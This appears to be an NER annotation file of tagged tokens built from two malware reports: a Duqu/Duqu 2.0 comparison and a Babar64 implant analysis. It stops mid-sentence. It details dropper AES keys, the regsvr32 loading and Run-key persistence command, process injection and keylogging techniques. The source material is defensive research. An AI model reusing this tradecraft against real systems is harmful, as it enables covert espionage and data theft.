.	O
The	O
network	O
communication	O
methods	O
used	O
by	O
Duqu	O
2.0	O
are	O
described	O
in	O
the	O
following	O
list	O
.	O
SocketServer1	O
.	O
In	O
export	O
function	O
nr1	O
,	O
if	O
in	O
the	O
config	O
the	O
"	O
startSockServer	O
"	O
parameter	O
is	O
set	O
,	O
it	O
will	O
start	O
a	O
server	O
accordingly	O
SocketServer2	O
.	O
Binds	O
between	O
ports	O
17000	O
and	O
17100	O
,	O
can	O
be	O
configured	O
to	O
be	O
client	O
or	O
server	O
GifServer	O
.	O
With	O
Custom	O
HTTP	O
Server	O
implementation	O
,	O
possibly	O
based	O
on	O
SocketServer2	O
PipeComm	O
.	O
PIPE	O
or	O
IPC	O
communication	O
,	O
customizable	O
network	O
communication	O
HttpClient	O
.	O
WinHTTP	O
-	O
based	O
,	O
simple	O
client	O
,	O
uses	O
"	O
COUNTRY=	O
"	O
in	O
cookie	O
parameters	O
,	O
(	O
standard	O
HTTP	O
client	O
)	O
Duqu	O
has	O
used	O
a	O
very	O
unique	O
user	O
agent	O
string	O
when	O
communicating	O
over	O
HTTP	O
.	O
Mozilla/5.0	O
(	O
Windows	O
;	O
U	O
;	O
Windows	O
NT	O
6.0	O
;	O
en	O
-	O
US	O
;	O
rv:1.9.2.9	O
)	O
In	O
contrast	O
,	O
Duqu	O
2.0	O
chooses	O
user	O
agent	O
string	O
randomly	O
from	O
a	O
large	O
set	O
of	O
often	O
used	O
values	O
listed	O
in	O
Sample	O
7	O
.	O
The	O
following	O
list	O
shows	O
the	O
browser	O
agent	O
strings	O
found	O
in	O
Duqu	O
2.0	O
.	O
Duqu	O
2.0	O
uses	O
more	O
than	O
one	O
method	O
to	O
import	O
functions	O
from	O
DLLs	O
.	O
One	O
of	O
the	O
methods	O
utilizes	O
a	O
hash	O
method	O
to	O
represent	O
function	O
names	O
as	O
4	O
byte	O
integers	O
.	O
It	O
iterates	O
through	O
all	O
importable	O
function	O
and	O
finds	O
the	O
one	O
whose	O
function	O
name	O
hash	O
matches	O
the	O
given	O
hash	O
.	O
This	O
hash	O
function	O
uses	O
a	O
magic	O
number	O
.	O
A	O
very	O
similar	O
import	O
method	O
and	O
hash	O
function	O
is	O
used	O
in	O
Duqu	O
and	O
Duqu	O
2.0	O
although	O
the	O
magic	O
numbers	O
are	O
different	O
:	O
0x86F186F1	O
and	O
0xB31FB31F.	O
Note	O
that	O
even	O
the	O
inner	O
structure	O
of	O
the	O
magic	O
numbers	O
are	O
similar	O
(	O
2x2	O
bytes	O
)	O
.	O
The	O
malware	O
can	O
transmit	B-Action
information	B-Entity
through	B-Modifier
HTTP	B-Entity
traffic	O
.	O
It	O
is	O
most	O
likely	O
that	O
one	B-Entity
or	I-Entity
more	I-Entity
infected	I-Entity
computers	I-Entity
can	O
be	O
proxy	O
points	O
towards	O
the	O
attacker	O
,	O
meaning	O
that	O
other	O
infected	O
computers	O
communicate	O
with	O
these	O
proxies	O
.	O
These	O
proxies	O
can	O
act	B-Action
as	O
HTTP	B-Action
or	B-Entity
HTTPS	I-Entity
servers	I-Entity
.	O
For	O
HTTPS	O
,	O
a	O
self	O
signed	O
certificate	O
is	O
created	O
by	O
the	O
malware	O
itself	O
.	O
(	O
Most	O
likely	O
by	O
contacting	O
gpl3.selfsigned.org	O
)	O
.	O
The	O
Common	O
Name	O
(	O
CN	O
)	O
field	O
seems	O
to	O
be	O
"	O
*	O
"	O
in	O
the	O
created	O
certificate	O
.	O
During	O
data	O
transfer	O
,	O
the	O
malware	O
uses	O
<	O
5	O
random	O
numbers>.gif	O
for	O
file	O
name	O
and	O
a	O
843-byte	O
GIF	O
file	O
+	O
additional	O
random	O
bytes	O
.	O
The	O
transmissions	O
may	O
be	O
protected	O
by	O
AES	O
.	O
One	O
possible	O
way	O
to	O
detect	O
such	O
transmission	O
(	O
if	O
cleartext	O
traffic	O
is	O
somehow	O
available	O
)	O
to	O
detect	O
the	O
actual	O
843-byte	O
GIF	O
file	O
.	O
For	O
the	O
known	O
two	O
samples	O
,	O
this	O
GIF	O
portion	O
was	O
identical	O
.	O
The	O
actual	O
image	O
in	O
hex	O
dump	O
is	O
the	O
following	O
.	O
The	O
image	O
itself	O
is	O
a	O
small	O
picture	O
,	O
basic	O
color	O
is	O
yellow	O
and	O
there	O
are	O
some	O
orange	O
dots	O
in	O
it	O
.	O
For	O
the	O
main	O
binary	O
of	O
the	O
malware	O
,	O
we	O
propose	O
the	O
following	O
rules	O
for	O
detection	O
.	O
We	O
've	O
made	O
an	O
initial	O
analysis	O
to	O
prove	O
our	O
claims	O
that	O
there	O
is	O
a	O
strong	O
connection	O
between	O
Duqu	O
and	O
Duqu	O
2.0	O
malwares	O
.	O
Our	O
main	O
goal	O
was	O
to	O
highlight	O
the	O
most	O
striking	O
similarities	O
and	O
differences	O
between	O
the	O
samples	O
.	O
Similarities	O
shows	O
that	O
the	O
developers	O
of	O
Duqu	O
2.0	O
have	O
reused	O
the	O
code	O
basis	O
of	O
the	O
old	O
Duqu	O
specimens	O
and	O
the	O
differences	O
found	O
in	O
the	O
binaries	O
indicates	O
that	O
the	O
developers	O
of	O
Duqu	O
have	O
modified	O
their	O
tools	O
to	O
avoid	O
detections	O
.	O
[	O
CrySySDuqu	O
]	O
CrySyS	O
,	O
Duqu	O
:	O
A	O
Stuxnet	O
-	O
like	O
malware	O
found	O
in	O
the	O
wild	O
,	O
v0.93	O
(	O
14/Oct/2011	O
)	O
http://www.crysys.hu/publications/files/bencsathPBF11duqu.pdf	O
[	O
SymantecDuqu	O
]	O
Symantec	O
,	O
W32.Duqu	O
:	O
The	O
precursor	O
to	O
the	O
next	O
Stuxnet	O
,	O
Version	O
1.4	O
(	O
November	O
23	O
,	O
2011	O
)	O
http://www.symantec.com/content/en/us/enterprise/media/security_response/white	O
papers	O
/	O
w32_duqu_the_precursor_to_the_next_stuxnet.pdf	O
[	O
KasperskyDuqu	O
]	O
Kaspersky	O
Lab	O
,	O
Duqu	O
:	O
Steal	O
Everything	O
,	O
Kaspersky	O
Lab	O
's	O
investigation	O
-	O
"	O
The	O
Mystery	O
of	O
Duqu	O
"	O
in	O
blogs	O
http://www.kaspersky.com/about/press/major_malware_outbreaks/duqu	O
[	O
SymantecDossier	O
]	O
Symantec	O
,	O
W32.Stuxnet	O
Dossier	O
,	O
Version	O
1.4	O
(	O
February	O
2011	O
)	O
http://www.symantec.com/content/en/us/enterprise/media/security_response/white	O
papers	O
/	O
w32_stuxnet_dossier.pdf	O
[	O
KasperskyDuqu2.0	O
]	O
Kaspersky	O
Lab	O
,	O
The	O
Duqu	O
2.0	O
:	O
Technical	O
Details	O
,	O
Version	O
:	O
1.9.8	O
(	O
2.June.2015	O
)	O
https://securelist.com	O
/	O
blog	O
/	O
research/70504/the	O
-	O
mystery	O
-	O
of	O
-	O
duqu-2	O
-	O
0-a	O
-	O
sophisticated-	O
cyberespionage	O
-	O
actor	O
-	O
returns/	O
Questions	O
and	O
comments	O
are	O
welcome	O
.	O
The	O
corresponding	O
author	O
is	O
Dr.	O
Boldizs	O
r	O
Bencs	O
th	O
bencsath@crysys.hu	O
Laboratory	O
of	O
Cryptography	O
and	O
System	O
Security	O
CrySyS	O
–	O
http://www.crysys.hu/	O
Budapest	O
University	O
of	O
Technology	O
and	O
Economics	O
Department	O
of	O
Telecommunications	O
1117	O
Magyar	O
Tud	O
sok	O
Krt	O
.	O
2	O
.	O
DROPPER	O
MD5	O
9fff114f15b86896d8d4978c0ad2813d	O
SHA-1	O
27a0a98053f3eed82a51cdefbdfec7bb948e1f36	O
File	O
Size	O
693.4	O
KB	O
(	O
710075	O
bytes	O
)	O
Compile	O
Time	O
2011	O
-	O
08	O
-	O
29	O
11:48:42	O
IMPLANT	O
MD5	O
4525141d9e6e7b5a7f4e8c3db3f0c24c	O
SHA-1	O
efbe18eb8a66e4b6289a5c53f22254f76e3a29bd	O
File	O
Size	O
585.4	O
KB	O
(	O
599438	O
bytes	O
)	O
Compile	O
Time	O
2011	O
-	O
08	O
-	O
29	O
13:02:29	O
Special	O
thanks	O
for	O
their	O
contribution	O
in	O
the	O
making	O
of	O
this	O
report	O
go	O
to	O
Morgan	O
Marquis	O
-	O
Boire	O
,	O
Joan	O
Calvet	O
,	O
Paul	O
Rascagn	O
res	O
,	O
Alex	O
Dulaunoy	O
,	O
Raphael	O
Vinot	O
and	O
the	O
remaining	O
team	O
of	O
CIRCL	O
Luxembourg	O
.	O
You	O
guys	O
rock	O
\m/	O
Comments	O
or	O
inquiries	O
please	O
direct	O
to	O
Marion	O
Marschalek	O
(	O
0xF372F2CA	O
)	O
.	O
Babar	O
and	O
the	O
related	O
crowd	O
of	O
animalesque	O
malware	O
will	O
be	O
presented	O
at	O
SyScan'15	O
conference	O
(	O
https://www.syscan.org/	O
)	O
in	O
March	O
2015	O
.	O
No	O
elephants	O
were	O
harmed	O
in	O
the	O
making	O
of	O
this	O
report	O
.	O
This	O
work	O
is	O
licensed	O
under	O
a	O
Creative	O
Commons	O
Attribution	O
-	O
NonCommercial	O
-	O
ShareAlike	O
4.0	O
International	O
License	O
.	O
Subject	O
of	O
this	O
analysis	O
is	O
a	O
fascinating	O
piece	O
of	O
malware	O
,	O
which	O
invades	O
Windows	O
desktop	O
machines	O
and	O
aims	O
at	O
..	O
well	O
,	O
all	O
the	O
things	O
.	O
The	O
analyzed	O
malware	O
consists	O
of	O
a	O
dropper	O
and	O
an	B-Entity
implant	I-Entity
,	O
which	O
invades	O
Windows	O
processes	O
to	O
steal	B-Action
data	B-Entity
from	B-Modifier
instant	B-Entity
messengers	I-Entity
,	I-Entity
softphones	I-Entity
,	I-Entity
browsers	I-Entity
and	I-Entity
office	I-Entity
applications	I-Entity
.	O
A	O
fully	O
blown	O
espionage	O
kit	O
,	O
so	O
to	O
say	O
,	O
sophisticated	O
almost	O
.	O
The	O
implant	O
is	O
able	O
to	O
hook	O
APIs	O
of	O
interest	O
in	O
dedicated	O
remote	O
processes	O
,	O
to	O
steal	B-Action
data	B-Entity
on	O
the	O
fly	O
.	O
More	O
interesting	O
than	O
the	O
malware	O
itself	O
though	O
is	O
the	O
path	O
to	O
the	O
associated	O
symbol	O
file	O
,	O
which	O
appears	O
embedded	O
in	O
the	O
dropper	O
.	O
The	O
analyzed	O
malware	O
samples	O
come	O
with	O
the	O
internal	O
project	O
name	O
'	O
Babar64	O
'	O
.	O
The	O
myth	O
of	O
Babar	O
has	O
been	O
around	O
for	O
a	O
while	O
in	O
the	O
intelligence	O
community	O
.	O
Questions	O
have	O
been	O
raised	O
since	O
Le	O
Monde	O
published	O
an	O
article	O
on	O
Babar	O
in	O
2014	O
[	O
1	O
]	O
and	O
were	O
recently	O
fuelled	O
by	O
a	O
leaked	O
government	O
presentation	O
found	O
among	O
a	O
stash	O
of	O
documents	O
published	O
in	O
January	O
by	O
Spiegel	O
[	O
2	O
]	O
.	O
The	O
leaked	O
document	O
was	O
authored	O
by	O
the	O
Communications	O
Security	O
Establishment	O
Canada	O
(	O
CSEC	O
)	O
and	O
reports	O
about	O
a	O
potential	O
nation	O
state	O
attack	O
involving	O
malware	O
named	O
Babar	O
.	O
The	O
actor	O
behind	O
the	O
attacks	O
is	O
assumed	O
to	O
be	O
French	O
inteligence	O
.	O
Assumptions	O
are	O
based	O
on	O
certain	O
binary	O
attributes	O
,	O
language	O
and	O
location	O
of	O
infrastructure	O
as	O
well	O
as	O
targets	O
.	O
The	O
binaries	O
at	O
hand	O
fit	O
well	O
with	O
the	O
description	O
CSEC	O
provides	O
,	O
although	O
it	O
is	O
quite	O
clear	O
they	O
are	O
a	O
newer	O
version	O
from	O
what	O
CSEC	O
had	O
uncovered	O
around	O
2009	O
.	O
It	O
is	O
not	O
clear	O
whether	O
the	O
compilation	O
timestamps	O
are	O
falsified	O
,	O
but	O
an	O
earlier	O
compilation	O
time	O
than	O
the	O
actual	O
stamp	O
seems	O
unlikely	O
.	O
Doubtlessly	O
though	O
,	O
the	O
Babar	O
binaries	O
match	O
with	O
a	O
malware	O
strain	O
representing	O
itself	O
as	O
Bunny	O
,	O
as	O
well	O
as	O
a	O
family	O
dubbed	O
NBOT	O
or	O
TFC	O
.	O
The	O
dropper	O
operates	O
straight	O
forward	O
;	O
it	B-Entity
fetches	O
the	O
encrypted	B-Entity
DLL	I-Entity
from	B-Modifier
its	I-Modifier
own	B-Entity
binary	I-Entity
from	I-Entity
outside	I-Entity
its	I-Entity
resource	I-Entity
section	I-Entity
,	O
decrypts	O
it	O
and	O
hides	B-Action
it	B-Entity
in	O
the	O
file	B-Entity
system	I-Entity
.	O
Then	O
it	O
goes	O
on	O
to	O
load	O
the	O
DLL	O
using	O
Windows	O
regsvr32.exe	O
.	O
To	O
achieve	O
this	O
it	O
spawns	O
a	O
dedicated	B-Entity
process	I-Entity
with	O
the	O
command	B-Entity
line	I-Entity
'	I-Entity
"	I-Entity
regsvr32.exe	I-Entity
"	I-Entity
/s	I-Entity
/n	I-Entity
/i	I-Entity
"	I-Entity
%	I-Entity
APPDATA%\%DLLNAME%	I-Entity
"	I-Entity
'	I-Entity
.	O
The	O
DLL	O
name	O
is	O
random	O
but	O
legitimately	O
looking	O
and	O
hardcoded	O
for	O
a	O
specific	O
dropper	O
.	O
It	O
is	O
also	O
stored	O
as	O
encrypted	O
string	O
in	O
the	O
binary	O
,	O
and	O
has	O
been	O
seen	O
to	O
decrypt	O
to	O
either	O
'	O
perf585.dll	O
'	O
or	O
'	O
dump21cb.dll	O
'	O
depending	O
on	O
the	O
dropper	O
.	O
The	O
encryption	O
algorithm	O
used	O
is	O
AES	O
(	O
Advanced	O
Encryption	O
Standard	O
)	O
with	O
128-bit	O
keys	O
.	O
The	O
keys	O
used	O
for	O
decryption	O
are	O
'	O
20	O
33	O
AF	O
73	O
A9	O
AC	O
72	O
D3	O
BE	O
E6	O
A5	O
73	O
92	O
BA	O
37	O
6C	O
'	O
for	O
the	O
implant	O
filename	O
and	O
'	O
A0	O
0E	O
3E	O
B3	O
3A	O
1C	O
D3	O
AA	O
A0	O
BE	O
3F	O
B3	O
F9	O
0A	O
96	O
15	O
'	O
for	O
decrypting	O
the	O
binary	O
.	O
AES	O
is	O
the	O
encryption	O
algorithm	O
of	O
choice	O
throughout	O
the	O
dropper	O
and	O
its	O
implant	O
's	O
operations	O
.	O
Interestingly	O
,	O
the	O
Babar	O
dropper	O
as	O
well	O
as	O
the	O
implant	O
show	O
a	O
similar	O
method	O
of	O
API	O
name	O
obfuscation	O
as	O
the	O
Bunny	O
malware	O
and	O
samples	O
from	O
the	O
NBOT	O
family	O
.	O
Dedicated	O
APIs	O
are	O
loaded	O
through	O
a	O
resolution	O
function	O
,	O
which	O
searches	O
for	O
library	O
exports	O
by	O
comparing	O
hashes	O
of	O
the	O
export	O
names	O
with	O
a	O
given	O
hash	O
.	O
For	O
the	O
Babar	O
project	O
though	O
the	O
attackers	O
used	O
an	O
adapted	O
version	O
of	O
SHA-1	O
,	O
as	O
opposed	O
to	O
the	O
simple	O
XOR	O
/	O
ROL	O
hash	O
algorithm	O
which	O
was	O
used	O
in	O
the	O
Bunny	O
project	O
.	O
After	O
infection	O
the	B-Entity
dropper	I-Entity
executes	O
a	O
separate	O
command	O
line	O
through	O
spawning	B-Action
a	B-Entity
cmd	I-Entity
.	I-Entity
process	I-Entity
,	O
which	O
is	O
instructed	O
to	O
wait	O
for	O
1	O
second	O
before	O
deleting	O
the	O
dropper	B-Entity
binary	I-Entity
on	I-Entity
disk	I-Entity
.	O
This	O
way	O
the	B-Entity
malware	I-Entity
reduces	O
forensic	O
artefacts	O
,	O
staying	O
behind	O
after	O
infection	O
.	O
Curiously	O
though	O
,	O
the	O
regsvr32.exe	O
process	O
used	O
to	O
load	O
the	O
dropped	O
implant	O
remains	O
running	O
.	O
This	O
way	O
Babar	O
leaves	O
a	O
visible	O
process	O
on	O
the	O
process	O
list	O
during	O
execution	O
.	O
As	O
the	O
project	O
name	O
'	O
Babar64	O
'	O
suggests	O
,	O
dropper	O
and	O
implant	O
are	O
designed	O
to	O
work	O
on	O
32-bit	O
and	O
on	O
64-bit	O
Windows	O
versions	O
.	O
However	O
,	O
process	O
hooking	O
and	O
injection	O
can	O
only	O
affect	O
32-bit	O
processes	O
due	O
to	O
the	O
bitness	O
of	O
the	O
implant	O
itself	O
.	O
Babar	O
's	B-Entity
implant	I-Entity
is	O
a	O
32-bit	O
DLL	O
written	O
in	O
C++	O
,	O
which	O
upon	O
start	O
injects	B-Action
itself	B-Entity
to	B-Modifier
running	B-Entity
processes	O
and	O
invades	O
desktop	B-Action
applications	B-Entity
by	O
applying	B-Action
a	B-Entity
global	I-Entity
Windows	I-Entity
hooks	I-Entity
.	O
The	O
implant	O
is	O
capable	O
of	O
logging	B-Action
keystrokes	B-Entity
,	O
capture	O
screen	O
shots	O
,	O
spy	O
on	O
installed	O
softphones	O
and	O
instant	O
messengers	O
next	O
to	O
a	O
list	O
of	O
simpler	O
espionage	O
tricks	O
.	O
Babar	O
is	O
a	O
fully	O
blown	O
espionage	O
tool	O
,	O
built	O
to	O
excessively	O
spy	O
on	O
the	O
user	O
's	O
activity	O
on	O
an	O
infected	O
machine	O
.	O
The	O
DLL	O
dropped	O
by	O
Babar	O
is	O
placed	O
into	O
the	O
application	O
data	O
folder	O
,	O
along	O
with	O
a	O
directory	O
named	O
'	O
MSI	O
'	O
where	O
the	O
runtime	O
data	O
will	O
be	O
stored	O
.	O
Babar	O
operates	O
through	O
multiple	O
instances	O
,	O
by	O
injecting	O
its	O
DLL	O
to	O
a	O
maximum	B-Entity
of	I-Entity
three	I-Entity
desktop	I-Entity
processes	I-Entity
.	O
This	O
is	O
achieved	O
by	O
loading	O
the	O
Babar	O
DLL	O
to	O
remote	O
processes	O
through	O
a	O
mapped	O
memory	O
object	O
.	O
Apart	O
from	O
that	O
,	O
Babar	O
comes	O
with	O
a	B-Entity
userland	I-Entity
rootkit	I-Entity
component	I-Entity
which	O
applies	O
global	B-Action
Windows	B-Entity
hooks	B-Action
to	O
invade	B-Action
all	B-Entity
processes	I-Entity
on	I-Entity
its	I-Entity
desktop	I-Entity
.	O
This	O
way	O
Babar	O
can	O
install	O
API	O
hooks	B-Entity
for	I-Entity
various	I-Entity
APIs	I-Entity
via	B-Modifier
Windows	O
Detours	B-Entity
technique	I-Entity
to	O
actively	O
steal	B-Action
data	B-Entity
from	O
arbitrary	O
processes	O
.	O
Babar	O
's	O
anti	O
-	O
analysis	O
measures	O
are	O
sparse	O
.	O
It	O
is	O
not	O
protected	O
by	O
a	O
runtime	O
packer	O
or	O
crypter	O
,	O
it	O
does	O
not	O
have	O
sandbox	O
detection	O
or	O
anti	O
-	O
debugging	O
measures	O
,	O
most	O
character	O
strings	O
are	O
shown	O
in	O
clear	O
-	O
text	O
.	O
Babar	O
does	O
show	O
the	O
same	O
obscure	O
treatment	O
for	O
installed	B-Action
anti	O
-	O
virus	O
products	O
as	O
the	O
Bunny	O
malware	O
though	O
.	O
Babar	O
also	O
enumerates	O
the	O
Windows	O
Management	O
Instrumentation	O
for	O
installed	O
AV	O
solutions	O
,	O
while	O
the	O
exact	O
use	O
of	O
this	O
information	O
is	O
not	O
yet	O
known	O
.	O
We	O
do	O
suspect	O
large	O
portions	O
of	O
the	O
product	O
enumeration	O
to	O
be	O
based	O
on	O
the	O
exact	O
same	O
source	O
code	O
as	O
the	O
module	O
Bunny	O
used	O
.	O
The	O
enumeration	O
function	O
issues	O
the	O
commands	O
„	O
SELECT	O
*	O
FROM	O
AntiVirusProduct	O
"	O
and	O
retrieves	O
attributes	O
such	O
as	O
'	O
productState	O
'	O
,	O
'	O
DisplayName	O
'	O
,	O
'	O
VersionNumber	O
'	O
and	O
'	O
productUptoDate	O
'	O
.	O
The	O
anti	O
-	O
virus	O
solutions	O
searched	O
for	O
are	O
again	O
identified	O
by	O
256-bit	O
SHA	O
hashes	O
.	O
Only	O
some	O
of	O
the	O
hashes	O
could	O
be	O
mapped	O
to	O
known	O
names	O
of	O
anti	O
-	O
virus	O
solutions	O
.	O
Babar	O
also	O
implements	O
an	O
obfuscation	B-Entity
technique	I-Entity
to	O
hide	B-Action
certain	B-Entity
API	I-Entity
names	I-Entity
.	O
Selected	O
APIs	O
are	O
identified	O
by	O
hashes	O
,	O
which	O
are	O
used	O
to	O
load	O
the	O
APIs	O
dynamically	O
at	O
runtime	O
.	O
The	O
hashes	O
are	O
hardcoded	O
within	O
the	O
binary	O
,	O
and	O
will	O
be	O
compared	O
to	O
hashed	O
library	O
exports	O
by	O
the	O
API	O
resolution	O
routine	O
.	O
The	O
hashing	O
algorithm	O
is	O
different	O
from	O
the	O
simple	O
XOR	O
/	O
ROL	O
technique	O
Bunny	O
uses	O
.	O
It	O
seems	O
to	O
be	O
based	O
on	O
SHA-1	O
,	O
but	O
generates	O
32-bit	O
hashes	O
instead	O
of	O
the	O
standard	O
160-bit	O
length	O
.	O
What	O
Bunny	O
,	O
Babar	O
and	O
NBOT	O
all	O
have	O
in	O
common	O
though	O
is	O
that	O
the	O
obfuscation	O
technique	O
is	O
easy	O
to	O
break	O
and	O
only	O
applied	O
to	O
a	O
subset	O
of	O
APIs	O
.	O
As	O
an	O
anti	O
-	O
analysis	O
trick	O
this	O
is	O
considerably	O
useless	O
,	O
it	O
does	O
make	O
sense	O
though	O
to	O
trick	O
malware	O
detection	O
solutions	O
which	O
apply	O
heuristics	O
based	O
on	O
static	O
analysis	O
of	O
API	O
calls	O
.	O
This	O
becomes	O
evident	O
when	O
looking	O
at	O
the	O
list	O
of	O
Babar	O
's	O
obfuscated	O
API	O
names	O
,	O
which	O
includes	O
RegisterRawInputDevices	O
,	O
GetRawInputData	O
,	O
GetClipboardData	O
or	O
DirectSoundCaptureCreate	O
.	O
The	O
startup	B-Entity
routine	I-Entity
of	I-Entity
the	I-Entity
Babar	I-Entity
implant	I-Entity
will	O
create	O
a	O
registry	B-Entity
key	I-Entity
under	B-Modifier
'	I-Modifier
[	B-Entity
HKU]\	I-Entity
..	I-Entity
\CurrentVersion\Run	I-Entity
'	I-Entity
to	B-Modifier
assure	O
persistence	O
.	O
The	O
key	O
is	O
named	O
'	O
MSSecurity	O
'	O
and	O
executes	O
the	O
exact	O
same	O
command	O
line	O
as	O
the	O
infector	O
,	O
every	O
time	O
the	O
system	O
boots	O
-	O
'	O
"	O
regsvr32.exe	O
"	O
/s	O
/n	O
/i	O
"	O
%	O
APPDATA%\%DLLNAME%	O
"	O
'	O
.	O
At	O
system	B-Action
boot	B-Entity
time	O
the	O
regsvr32.exe	B-Entity
process	I-Entity
will	O
start	O
,	O
load	O
the	O
Babar	B-Entity
DLL	I-Entity
and	O
thus	O
'	O
deploy	O
'	O
the	O
malware	O
to	O
various	O
legitimate	O
processes	O
.	O
As	O
opposed	O
to	O
persistence	O
,	O
Babar	O
also	O
implements	O
functionality	O
to	O
uninstall	B-Action
itself	B-Entity
from	O
the	O
affected	B-Entity
system	I-Entity
.	O
Interesting	O
again	O
,	O
same	O
as	O
during	O
infection	O
,	O
the	O
regsvr32.exe	O
process	O
remains	O
running	O
even	O
after	O
Babar	O
is	O
readily	O
set	O
up	O
.	O
During	O
initialization	O
Babar	O
loads	O
and	O
decrypts	O
a	O
set	O
of	O
configuration	O
parameters	O
which	O
are	O
appended	O
to	O
the	O
DLL	O
's	O
relocation	O
section	O
.	O
ASCII	O
strings	O
within	O
the	O
configuration	O
data	O
reveal	O
a	O
lot	O
about	O
Babar	O
's	O
intentions	O
.	O
As	O
could	O
be	O
seen	O
already	O
in	O
binaries	O
of	O
related	O
families	O
,	O
next	O
to	O
the	O
hardcoded	O
configuration	O
data	O
Babar	O
maintains	O
a	O
system	O
specific	O
runtime	O
configuration	O
.	O
The	O
additional	O
configuration	O
consists	O
of	O
a	O
set	O
of	O
local	O
attributes	O
and	O
a	O
set	O
of	O
values	O
derived	O
from	O
the	O
Windows	O
environment	O
.	O
The	O
attributes	O
are	O
dynamically	O
generated	O
or	O
requested	O
at	O
runtime	O
and	O
not	O
stored	O
in	O
memory	O
.	O
Values	O
retrieved	O
from	O
Windows	O
environment	O
.	O
The	O
DLL	O
when	O
loaded	O
in	O
the	O
context	O
of	O
an	O
application	O
seeks	O
to	O
invade	O
a	O
maximum	O
of	O
two	O
more	O
victim	O
processes	O
.	O
This	O
for	O
once	O
is	O
a	O
resilience	O
measure	O
,	O
so	O
if	O
the	O
initially	O
infected	O
process	O
stops	O
running	O
the	O
malware	O
remains	O
in	O
memory	O
through	O
additional	O
instances	O
.	O
On	O
the	O
other	O
hand	O
it	O
is	O
practically	O
a	O
load	O
balancing	O
measure	O
.	O
The	O
C&C	O
communication	O
module	O
is	O
located	O
in	O
an	O
export	O
of	O
the	O
DLL	O
,	O
which	O
will	O
be	O
executed	O
through	O
a	O
remote	O
thread	O
,	O
injected	O
like	O
the	O
child	O
processes	O
,	O
via	O
a	O
memory	O
-	O
mapped	O
file	O
.	O
The	O
process	O
infection	O
is	O
achieved	O
by	O
mapping	O
a	O
shared	O
object	O
into	O
the	O
victim	O
's	O
process	O
space	O
and	O
invoking	O
a	O
function	O
stub	O
as	O
remote	O
thread	O
.	O
The	O
steps	O
being	O
taken	O
are	O
.	O
The	O
function	B-Entity
stub	I-Entity
will	O
then	O
go	O
on	O
to	O
load	O
the	O
Babar	B-Entity
DLL	I-Entity
through	B-Modifier
LoadLibraryA	B-Entity
and	O
execute	O
one	B-Action
of	B-Entity
its	I-Entity
exports	I-Entity
,	O
as	O
indicated	O
in	O
the	O
shared	O
memory	O
.	O
The	O
mapped	O
object	O
contains	O
name	O
and	O
path	O
to	O
the	O
malicious	O
DLL	O
,	O
the	O
name	O
of	O
the	O
pipe	O
being	O
used	O
for	O
communication	O
between	O
the	O
instances	O
,	O
the	O
name	O
of	O
the	O
export	O
from	O
the	O
DLL	O
to	O
be	O
called	O
as	O
well	O
as	O
information	O
about	O
instances	O
already	O
running	O
.	O
For	O
picking	O
a	O
process	O
to	O
infect	O
the	O
malware	O
randomly	O
picks	O
one	O
from	O
a	O
list	O
of	O
prospects	O
.	O
These	O
have	O
to	O
be	O
32-bit	O
processes	O
,	O
not	O
already	O
infected	O
and	O
not	O
among	O
a	O
list	O
of	O
processes	O
to	O
avoid	O
such	O
as	O
winlogon.exe	O
,	O
explorer.exe	O
,	O
cmd.exe	O
or	O
regsvr32.exe	O
.	O
This	O
way	O
Babar	O
always	O
keeps	O
three	O
instances	O
in	O
memory	O
.	O
The	O
first	O
one	O
to	O
start	O
up	O
will	O
be	O
the	O
'	O
main	O
instance	O
'	O
.	O
If	O
any	O
of	O
the	O
instances	O
dies	O
,	O
a	O
new	O
third	O
instance	O
will	O
be	O
created	O
.	O
If	O
the	O
main	O
instance	O
dies	O
the	O
oldest	O
child	O
will	O
take	O
over	O
.	O
For	O
inter	B-Action
process	B-Entity
communication	I-Entity
Babar	O
uses	O
named	O
pipes	O
.	O
The	O
main	O
instance	O
generates	O
a	O
random	O
GUID	O
which	O
is	O
used	O
as	O
name	O
and	O
passed	O
to	O
child	O
instances	O
.	O
At	O
the	O
same	O
time	O
,	O
the	B-Entity
main	I-Entity
instance	I-Entity
creates	B-Action
six	I-Action
named	B-Entity
pipes	I-Entity
using	O
the	O
very	B-Entity
same	I-Entity
GUID	I-Entity
.	O
These	O
pipes	O
represent	O
the	O
server	O
side	O
for	O
child	O
instances	O
,	O
and	O
also	O
the	O
point	O
to	O
connect	O
to	O
for	O
hooks	O
Babar	O
installs	O
to	O
spy	O
on	O
several	O
system	O
APIs	O
.	O
The	O
spying	B-Entity
activities	I-Entity
are	O
performed	O
either	O
through	O
the	O
Babar	B-Entity
instance	I-Entity
locally	O
or	O
via	O
a	O
global	B-Entity
Windows	I-Entity
hook	I-Entity
invading	I-Entity
all	I-Entity
processes	I-Entity
running	I-Entity
in	I-Entity
the	I-Entity
same	I-Entity
desktop	I-Entity
.	O
Instance	O
-	O
local	O
capabilities	O
are	O
basic	O
spying	O
on	O
window	O
names	O
or	O
snooping	O
on	O
the	O
clipboard	O
data	O
,	O
while	O
the	B-Entity
global	I-Entity
hooks	I-Entity
manage	O
to	O
steal	B-Action
information	B-Entity
directly	O
from	O
Windows	O
API	B-Entity
calls	I-Entity
.	O
A	O
summary	O
of	O
the	O
capabilities	O
would	O
be	O
as	O
follows	O
.	O
The	O
keylogger	O
is	O
based	O
on	O
the	O
raw	O
input	O
model	O
.	O
The	O
malware	O
creates	B-Action
an	B-Entity
invisible	I-Entity
window	I-Entity
,	O
with	O
no	O
other	O
purpose	O
than	O
to	O
receive	O
window	O
messages	O
.	O
By	O
processing	O
the	O
window	O
message	O
queue	O
it	O
filters	O
out	O
input	O
events	O
and	O
dispatches	O
them	O
to	O
a	O
raw	O
input	O
device	O
object	O
.	O
Said	O
object	O
is	O
configured	O
to	O
grab	O
keyboard	O
events	O
through	O
GetRawInputData	O
.	O
The	O
snooped	O
keystroke	O
data	O
is	O
passed	O
to	B-Modifier
a	B-Entity
thread	I-Entity
,	O
which	O
performs	B-Action
encryption	B-Entity
and	O
dumps	O
the	O
data	O
to	O
a	O
log	O
file	O
.	O
The	O
file	O
is	O
located	O
in	O
Babar	O
's	O
working	O
directory	O
and	O
named	O
update.msi	O
.	O
The	O
design	O
of	O
the	O
keylogging	O
component	O
is	O
simple	O
but	O
effective	O
.	O
Babar	O
is	O
able	O
to	O
sniff	O
all	O
keystrokes	B-Entity
happening	I-Entity
on	I-Entity
the	I-Entity
same	I-Entity
desktop	I-Entity
as	I-Entity
its	I-Entity
invisible	I-Entity
window	I-Entity
.	O
Interesting	O
though	O
,	O
the	O
code	O
seen	O
in	O
Babar	O
's	O
implant	O
is	O
remarkably	O
similar	O
to	O
an	O
